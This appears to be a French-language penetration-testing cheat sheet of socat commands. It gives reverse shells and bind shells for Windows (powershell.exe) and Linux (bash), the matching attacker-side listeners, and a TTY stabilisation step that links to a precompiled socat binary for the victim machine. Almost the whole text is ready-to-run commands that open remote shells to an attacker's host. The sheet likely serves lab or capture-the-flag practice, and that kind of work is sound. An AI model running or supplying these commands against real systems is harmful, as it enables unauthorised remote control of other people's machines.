# Reverse shells

[Attaquant]
```
socat TCP-L:<port> -
```

Windows
```
socat TCP:<IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

Linux

```
socat TCP:<IP>:<LOCAL-PORT> EXEC:"bash -li"
```

# Bind Shells

Windows
```
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

Linux
```
socat TCP-L:<PORT> EXEC:"bash -li"
```

[Attaquant]
```
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```


### Stabiliser des shells avec socat

[Attaquant] target -> Linux
```
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

[Victime] <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">Socat précompilé</a>
```
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
